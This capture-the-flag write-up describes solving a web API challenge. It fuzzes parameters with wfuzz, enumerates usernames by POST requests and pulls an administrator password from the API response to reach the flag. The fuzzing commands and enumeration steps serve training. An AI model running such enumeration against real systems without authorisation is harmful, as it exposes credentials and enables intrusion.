Challenge of the training platform for ICC. 

## Description: 
We found a nice target where some backend API communication is happening behind the scenes at
http://challenge-01.icsc.cybexer.io:8080.
Sometimes it is possible to extract valuable information by tampering some parameters.
Some dictionary attack may be used against index.php script and it seems that a web proxy is best tool for this job.

**Question**
Can you reverse engineer messages and extract some information from this endpoint?

## Enumeration
Opening the webpage gives an error: "Backend API Error, empty request OR name not set"

The description states that we can tamper with some parameters, so we probably have to add some parameters to the url to do something. We can fuzz to see if there are any parameters we can use.  Probably something to do with name, as the webpage states ' name not set'

First we take a look at GET requests: 
```

Target: http://challenge-01.icsc.cybexer.io:8080/?FUZZ=test
Total requests: 2588

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                           
=====================================================================

000000015:   200        0 L      4 W        26 Ch       "user"                                            

Total time: 0
Processed Requests: 2588
Filtered Requests: 2587
Requests/sec.: 0
```

This shows that there is indeed a parameter user that we can use! However, when we curl the page with a get request, we get an error:

`curl -X GET -k challenge-01.icsc.cybexer.io:8080/?user=test`  
Gives:  
`Request method not allowed   `

So we continue and try a POST request:
`curl -X POST -k challenge-01.icsc.cybexer.io:8080/?user=test`  
Gives:  
`No user found with name: test `

So we need to fuzz for what names actually give another output.
`wfuzz -c -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -X POST --hs 'No user found'  http://challenge-01.icsc.cybexer.io:8080/?user=FUZZ`  
--> We now use the usernames list as we want to look for usernames. 

This gives us: 
```

Total requests: 17

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                           
=====================================================================

000000009:   200        0 L      6 W        117 Ch      "administrator"                                   

Total time: 0
Processed Requests: 17
Filtered Requests: 16
Requests/sec.: 0
```

So we have a user called administrator. We check what the page now shows:

`curl -X POST -k challenge-01.icsc.cybexer.io:8080/?user=administrator`

Gives:  
```Username: administrator<br>Password: terminator008<br>UserID:   1<br>IP:        127.0.0.1<br>Documentroot:  /virtualadmin<br> ```

So we have a user **administrator** with password **terminator008* which has a document root at **/virtualadmin**. So we check the /virtualadmin location, which gives us an API location. Where we can log in with the credentials. Then it shows us the flag!!
